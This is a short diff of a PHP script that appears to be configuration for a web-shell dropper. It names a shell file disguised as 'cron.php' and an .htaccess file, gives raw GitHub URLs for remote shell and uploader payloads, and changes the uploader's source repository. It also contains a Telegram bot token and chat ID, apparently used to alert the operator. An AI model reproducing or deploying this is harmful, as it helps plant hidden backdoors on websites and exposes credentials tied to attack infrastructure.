@@ -17,7 +17,7 @@ $namaShell = 'cron.php';
 $namaHtaccess = '.htaccess';
 $urlFileShell = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/messiah.php';
 $urlFileHtaccess = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/.htaccess';
-$urlUploader = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/pikasso.php';
+$urlUploader = 'https://raw.githubusercontent.com/lamentpicasso/lament/main/pikasso.php';
 
 $telegramBotToken = '8274961786:AAEGSehVAxHiW5ZHJo8PG7bcCmaayLGCDoI';
 $telegramChatId = '5754370773';
